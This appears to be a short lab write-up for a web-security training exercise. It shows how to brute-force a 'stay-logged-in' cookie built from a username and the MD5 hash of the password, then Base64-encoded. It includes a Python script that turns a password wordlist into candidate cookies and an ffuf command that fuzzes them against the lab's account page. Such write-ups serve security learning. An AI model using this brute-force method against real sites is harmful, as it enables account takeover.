# Lab description:

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing. 

The stay logged in cookies is generated this way:

username: + MD5 hash of the password
and then encoded in Base64

so we can generate the cookie list with the following python script

```python
import hashlib
import base64

prefix = "carlos:"
with open("input.txt", "r") as file:
    for word in file:
        word = word.strip()  # Remove newline
        md5_hash = hashlib.md5(word.encode()).hexdigest()
        result = prefix + md5_hash
        base64_encoded = base64.b64encode(result.encode()).decode()
        print(base64_encoded)
```

and then us ffuf to fuzz the codes
```bash
ffuf -w tokens.txt -u "https://0a5e00200487c7fb81b1c634004a0066.web-security-academy.net/my-account?id=carlos" -b "stay-logged-in=FUZZ" -ac
```
